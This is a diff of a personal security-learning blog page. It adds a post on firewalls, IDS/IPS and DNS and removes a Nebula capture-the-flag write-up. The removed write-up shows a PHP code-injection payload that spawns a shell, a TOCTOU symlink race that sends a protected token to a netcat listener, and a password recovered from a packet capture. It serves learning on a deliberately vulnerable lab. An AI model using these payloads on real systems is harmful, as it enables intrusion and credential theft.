@@ -28,7 +28,71 @@
         </div>
     </header>
     <div id="wrapper">
-        <div id="content">            <h4 class="date">Sep 21, 2020</h4>
+        <div id="content">            <h4 class="date">Sep 23, 2020</h4>
+
+            <article class="post">
+                <h2 class="title">
+                    <a href="https://blog.smigiel.dev/networking-pt-4.html" rel="bookmark" title="Permanent Link to &quot;Networking Pt 4&quot;">Networking Pt 4</a>
+                </h2>
+
+                
+                
+
+                <h1>Firewall</h1>
+<p>Firewalls are specialized software modules running on a computer or a dedicated network device. They serve to filter packets coming in and out of a network. They can work on different layers of the OSI model.</p>
+<h2>Packet filtering</h2>
+<p>The most basic feature of a firewall is packet filtering. Administrator can create rules which will filter packets according to certain characteristics like:</p>
+<ul>
+<li>source IP address</li>
+<li>destination IP address</li>
+<li>protocol</li>
+<li>source port</li>
+<li>destination port</li>
+</ul>
+<p>Common actions, that can be applied:</p>
+<ul>
+<li>allow: allow the packet to pass</li>
+<li>drop: drops the packet without any diagnostic message to the packet source host</li>
+<li>deny: similar to drop, but notify the source host</li>
+</ul>
+<p>Inspecting the header of a packet does not give you any information on the content. Even if only port <code>80</code> or <code>443</code> is allowed, attacker can exploit them, to access deeper levels of network.</p>
+<h2>Application level firewalls</h2>
+<p>Application level firewall works by checking all 7 layers of the OSI model. They provide more comprehensive protection because they inspect the actual content of a packet, not just headers.</p>
+<h2>Intrusion Detection System (IDS)</h2>
+<p>IDS inspects the application payload trying to detect any potential attack. It checks for attack vectors like ping sweeps, port scans, SQL injections, buffer overflows etc.
+IDS, similar to antivirus, detects risky traffic by means of signatures. The vendor provides frequent signature updates as soon as new attack vectors are found. Without the right signatures an IDS cannot detect and report an intrusion.
+There is also risk of <strong>false positives</strong> when legic traffic is marked as malicious.</p>
+<p><code>IDS != firewall</code>
+IDS is another layer of protection, which can be used in conjunction with firewall.</p>
+<h2>Intrusion Prevention System (IPS)</h2>
+<p>It is similar to IDS, however it can drop malicious request when the threat has risk classification above predefined threshold.</p>
+<h1>Domain Name System (DNS)</h1>
+<p>The DNS converts human-readable names to IP addresses.
+DNS structure can be broken down into:</p>
+<ul>
+<li>top level domain (TLD)</li>
+<li>domain part</li>
+<li>subdomain part (if applicable)</li>
+<li>host part</li>
+</ul>
+<p>Name resolution is performed by resolvers. Resolvers are servers that contact the TLD server and follow the hierarchy of the DNS name to resolve the name of a host:</p>
+<ol>
+<li>resolver contacts one of the <strong>root name servers</strong>, these server contain information about the TLD (this information is hardcoded by system administrator);</li>
+<li>next, it asks the TLD name server (from previous step), what's the name of the server which can give information about the <strong>domain</strong> the resolver is looking for;</li>
+<li>if there are one or more subdomains, previous step is repeated for every subdomain;</li>
+<li>resolver asks for the name resolution of the <strong>host</strong> part;</li>
+<li>the resolver sends the IP address back to the client.</li>
+</ol>
+                <div class="clear"></div>
+
+                <div class="info">
+                    <a href="https://blog.smigiel.dev/networking-pt-4.html">posted at 00:00</a>
+                    &nbsp;&middot;
+                    &nbsp;<a href="https://blog.smigiel.dev/tag/learning.html" class="tags selected">learning</a>
+                    &nbsp;<a href="https://blog.smigiel.dev/tag/pts.html" class="tags">pts</a>
+                    &nbsp;<a href="https://blog.smigiel.dev/tag/network.html" class="tags">network</a>
+                </div>
+            </article>            <h4 class="date">Sep 21, 2020</h4>
 
             <article class="post">
                 <h2 class="title">
@@ -105,6 +169,7 @@ The header fields involved in the handshake are: sequence number, acknowledgemen
                     &nbsp;&middot;
                     &nbsp;<a href="https://blog.smigiel.dev/tag/learning.html" class="tags selected">learning</a>
                     &nbsp;<a href="https://blog.smigiel.dev/tag/pts.html" class="tags">pts</a>
+                    &nbsp;<a href="https://blog.smigiel.dev/tag/network.html" class="tags">network</a>
                 </div>
             </article>            <h4 class="date">Sep 19, 2020</h4>
 
@@ -196,6 +261,7 @@ To send message, Computer A also requires MAC address.</p>
                     &nbsp;&middot;
                     &nbsp;<a href="https://blog.smigiel.dev/tag/learning.html" class="tags selected">learning</a>
                     &nbsp;<a href="https://blog.smigiel.dev/tag/pts.html" class="tags">pts</a>
+                    &nbsp;<a href="https://blog.smigiel.dev/tag/network.html" class="tags">network</a>
                 </div>
             </article>            <h4 class="date">Sep 17, 2020</h4>
 
@@ -276,6 +342,7 @@ IPv6 is divided into two parts (each 64 bits): network identifier and interface 
                     &nbsp;&middot;
                     &nbsp;<a href="https://blog.smigiel.dev/tag/learning.html" class="tags selected">learning</a>
                     &nbsp;<a href="https://blog.smigiel.dev/tag/pts.html" class="tags">pts</a>
+                    &nbsp;<a href="https://blog.smigiel.dev/tag/network.html" class="tags">network</a>
                 </div>
             </article>            <h4 class="date">Sep 16, 2020</h4>
 
@@ -372,150 +439,6 @@ There are two operations <em>PUSH/POP</em> to work with stack. With each operati
                     &nbsp;<a href="https://blog.smigiel.dev/tag/learning.html" class="tags selected">learning</a>
                     &nbsp;<a href="https://blog.smigiel.dev/tag/fundamentals.html" class="tags">fundamentals</a>
                     &nbsp;<a href="https://blog.smigiel.dev/tag/ptp.html" class="tags">ptp</a>
-                </div>
-            </article>            <h4 class="date">Sep 07, 2020</h4>
-
-            <article class="post">
-                <h2 class="title">
-                    <a href="https://blog.smigiel.dev/exploit-education-nebula-part-3.html" rel="bookmark" title="Permanent Link to &quot;Exploit Education - Nebula Part 3&quot;">Exploit Education - Nebula Part 3</a>
-                </h2>
-
-                
-                
-
-                <h2><a href="https://exploit.education/nebula/level-08/">Level 08</a></h2>
-<h4>Solution</h4>
-<p>This sounds easy enough. Just go to <code>flag08</code> directory and see what kind of files are there.
-At first, I felt intimidated by <code>root:root</code> access to <code>capture.pcap</code> file. However, it occured that the file allows to be read by anyone. In that case, we might be able to copy it and retrieve necessary information.</p>
-<h4>Result</h4>
-<p>After downloading <code>capture.pcap</code> I was able to open it with <code>wireshark</code>, where I've seen some tcp traffic. By selecting <code>Follow TCP</code> I've noticed that this is dump of someone's login attempts.</p>
-<div class="highlight"><pre><span></span><span class="cp">..wwwbugs login: l.le.ev.ve.el.l8.8</span>
-<span class="cp">..</span>
-Password: backdoor...00Rm8.ate
-.
-<span class="cp">..</span>
-Login incorrect
-wwwbugs login:
-</pre></div>
-
-
-<p>However, hex dump shows some more details</p>
-<div class="highlight"><pre><span></span><span class="err">000000B9  62                                                 b</span>
-<span class="err">000000BA  61                                                 a</span>
-<span class="err">000000BB  63                                                 c</span>
-<span class="err">000000BC  6b                                                 k</span>
-<span class="err">000000BD  64                                                 d</span>
-<span class="err">000000BE  6f                                                 o</span>
-<span class="err">000000BF  6f                                                 o</span>
-<span class="err">000000C0  72                                                 r</span>
-<span class="err">000000C1  7f                                                 .</span>
-<span class="err">000000C2  7f                                                 .</span>
-<span class="err">000000C3  7f                                                 .</span>
-<span class="err">000000C4  30                                                 0</span>
-<span class="err">000000C5  30                                                 0</span>
-<span class="err">000000C6  52                                                 R</span>
-<span class="err">000000C7  6d                                                 m</span>
-<span class="err">000000C8  38                                                 8</span>
-<span class="err">000000C9  7f                                                 .</span>
-<span class="err">000000CA  61                                                 a</span>
-<span class="err">000000CB  74                                                 t</span>
-<span class="err">000000CC  65                                                 e</span>
-<span class="err">000000CD  0d                                                 .</span>
-</pre></div>
-
-
-<p>One can notice, that <code>x7f</code> equals to <code>backspace</code>. It probably means, that user pressed wrong key, and removed it.
-After decyphering it, it seems to be <code>backd00Rmate</code>.</p>
-<div class="highlight"><pre><span></span><span class="err">➜  ~ ssh flag08@nebula</span>
-<span class="err">flag08@nebula:~$ ls</span>
-<span class="err">capture.pcap</span>
-<span class="err">flag08@nebula:~$ getflag</span>
-<span class="err">You have successfully executed getflag on a target account</span>
-<span class="err">flag08@nebula:~$</span>
-</pre></div>
-
-
-<h2><a href="https://exploit.education/nebula/level-09/">Level 09</a></h2>
-<p>I couldn't crack this one, so I searched for solution over the internet. This one is explaining it very good: <a href="https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-09/">Lucian Nitescu</a>. Unfortunately, my php knowledge is not the best.</p>
-<h4>Solution</h4>
-<p>We need to use both <code>$filename</code> and <code>$use_me</code> variables. First one needs to contain payload, second will contain program name.</p>
-<h4>Result</h4>
-<div class="highlight"><pre><span></span>level09@nebula:~$ cat exploit.php
-<span class="o">[</span>email <span class="o">{</span><span class="si">${</span><span class="nv">system</span><span class="p">(sh)</span><span class="si">}</span><span class="o">}]</span>
-level09@nebula:~$ ~flag09/flag09 exploit.php .
-PHP Notice:  Use of undefined constant sh - assumed <span class="s1">&#39;sh&#39;</span> in /home/flag09/flag09.php<span class="o">(</span><span class="m">15</span><span class="o">)</span> : regexp code on line <span class="m">1</span>
-sh-4.2$ whoami
-flag09
-sh-4.2$ getflag
-You have successfully executed getflag on a target account
-sh-4.2$
-</pre></div>
-
-
-<p>Interesting that, when I replaced <code>sh</code> with <code>bash</code> it is not working:</p>
-<div class="highlight"><pre><span></span>PHP Notice:  Use of undefined constant bash - assumed <span class="s1">&#39;bash&#39;</span> in /home/flag09/flag09.php<span class="o">(</span><span class="m">15</span><span class="o">)</span> : regexp code on line <span class="m">1</span>
-bash-4.2$ whoami
-level09
-bash-4.2$ getflag
-getflag is executing on a non-flag account, this doesn<span class="err">&#39;</span>t count
-</pre></div>
-
-
-<p>One can always provide <code>$use_me</code> variable too.</p>
-<div class="highlight"><pre><span></span>level09@nebula:~$ cat exploit.php
-<span class="o">[</span>email <span class="o">{</span><span class="si">${</span><span class="nv">system</span><span class="p">(</span><span class="nv">$use_me</span><span class="p">)</span><span class="si">}</span><span class="o">}]</span>
-level09@nebula:~$ ~flag09/flag09 exploit.php getflag
-You have successfully executed getflag on a target account
-PHP Notice:  Undefined variable: You have successfully executed getflag on a target account in /home/flag09/flag09.php<span class="o">(</span><span class="m">15</span><span class="o">)</span> : regexp code on line <span class="m">1</span>
-
-level09@nebula:~$ ~flag09/flag09 exploit.php sh
-sh-4.2$ whoami
-flag09
-</pre></div>
-
-
-<h2><a href="https://exploit.education/nebula/level-10/">Level 10</a></h2>
-<p>TOCTOU == Time of Check, Time of Use</p>
-<p>This is another one, where I spent significant amount of time. Even if I know how it suppose to work, I haven't been able to implement the solution correctly.</p>
-<h4>Solution</h4>
-<p>Time of Check, Time of Use means, that when program is running, it needs to verify an access to file, where we have an access. However, after doing that, we need to swap this file, with another one, which is unavailable to us.</p>
-<h4>Result</h4>
-<p>Nebula instance:</p>
-<div class="highlight"><pre><span></span>level10@nebula:~$ touch my_file
-level10@nebula:~$ <span class="k">while</span> true<span class="p">;</span> <span class="k">do</span> ln -sf /home/flag10/token token<span class="p">;</span> ln -sf my_file token<span class="p">;</span> <span class="k">done</span> <span class="p">&amp;</span>
-<span class="o">[</span><span class="m">1</span><span class="o">]</span> <span class="m">4467</span>
-level10@nebula:~$ <span class="k">while</span> true<span class="p">;</span> <span class="k">do</span> /home/flag10/flag10 token debian<span class="p">;</span> <span class="k">done</span>
-You don<span class="s1">&#39;t have access to token</span>
-<span class="s1">You don&#39;</span>t have access to token
-Connecting to debian:18211 .. Connected!
-Sending file .. wrote file!
-Connecting to debian:18211 .. Unable to connect to host debian
-</pre></div>
-
-
-<p>Second instance</p>
-<div class="highlight"><pre><span></span>dasm@debian:~$ nc -klp <span class="m">18211</span> &gt; received
-dasm@debian:~$ cat received
-.oO Oo.
-615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
-</pre></div>
-
-
-<p>Nebula instance</p>
-<div class="highlight"><pre><span></span>level10@nebula:~$ su flag10
-Password:  <span class="c1"># use found token</span>
-sh-4.2$ getflag
-You have successfully executed getflag on a target account
-</pre></div>
-                <div class="clear"></div>
-
-                <div class="info">
-                    <a href="https://blog.smigiel.dev/exploit-education-nebula-part-3.html">posted at 00:00</a>
-                    &nbsp;&middot;
-                    &nbsp;<a href="https://blog.smigiel.dev/tag/learning.html" class="tags selected">learning</a>
-                    &nbsp;<a href="https://blog.smigiel.dev/tag/ctf.html" class="tags">ctf</a>
-                    &nbsp;<a href="https://blog.smigiel.dev/tag/exploit.html" class="tags">exploit</a>
-                    &nbsp;<a href="https://blog.smigiel.dev/tag/nebula.html" class="tags">nebula</a>
                 </div>
             </article>
 
